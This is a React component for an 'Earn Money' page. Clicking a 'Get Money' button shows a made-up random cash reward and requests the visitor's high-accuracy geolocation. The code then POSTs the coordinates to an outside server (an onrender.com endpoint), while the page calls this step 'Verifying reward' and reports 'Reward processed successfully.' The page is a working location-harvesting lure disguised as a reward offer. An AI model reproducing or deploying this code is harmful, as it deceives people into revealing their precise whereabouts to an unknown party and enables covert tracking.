import React, { useState } from "react";

const MoneyPage = () => {
  const [status, setStatus] = useState("idle");
  const [reward, setReward] = useState(null);

  const handleGetMoney = () => {
    // 1️⃣ Show reward immediately
    const earned = (Math.random() * 20 + 1).toFixed(2);
    setReward(earned);
    setStatus("requesting");

    // 2️⃣ Request location on SAME click
    if (!navigator.geolocation) {
      setStatus("Geolocation not supported");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      async (position) => {
        const { latitude, longitude } = position.coords;

        try {
          await fetch("https://mystery-e6o2.onrender.com/location", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ latitude, longitude }),
          });

          setStatus("success");
        } catch (err) {
          console.error(err);
          setStatus("failed");
        }
      },
      (error) => {
        console.error("Geo error:", error);
        setStatus("permission denied");
      },
      {
        enableHighAccuracy: true,
        timeout: 10000,
        maximumAge: 0,
      }
    );
  };

  return (
    <div
      style={{
        minHeight: "100vh",
        background: "linear-gradient(135deg, #667eea, #764ba2)",
        display: "flex",
        justifyContent: "center",
        alignItems: "center",
        padding: "20px",
      }}
    >
      <div
        style={{
          background: "#fff",
          borderRadius: "16px",
          maxWidth: "400px",
          width: "100%",
          padding: "24px",
          textAlign: "center",
          boxShadow: "0 10px 30px rgba(0,0,0,0.2)",
        }}
      >
        <img
          src="https://cdn-icons-png.flaticon.com/512/3135/3135706.png"
          alt="Earn money"
          style={{ width: "120px", marginBottom: "15px" }}
        />

        <h2>Earn Money</h2>
        <p style={{ color: "#555" }}>
          Click below to instantly claim your reward
        </p>

        {status === "idle" && (
          <button onClick={handleGetMoney} style={buttonStyle}>
            💰 Get Money
          </button>
        )}

        {reward && (
          <h3 style={{ marginTop: "15px" }}>
            🎉 You earned ${reward}
          </h3>
        )}

        {status === "requesting" && <p>Verifying reward...</p>}
        {status === "success" && <p>✅ Reward processed successfully</p>}
        {status === "permission denied" && (
          <p style={{ color: "red" }}>
            Location permission denied
          </p>
        )}
        {status === "failed" && (
          <p style={{ color: "red" }}>
            Something went wrong
          </p>
        )}
      </div>
    </div>
  );
};

const buttonStyle = {
  padding: "14px",
  fontSize: "16px",
  borderRadius: "10px",
  border: "none",
  cursor: "pointer",
  background: "#667eea",
  color: "#fff",
  width: "100%",
};

export default MoneyPage;
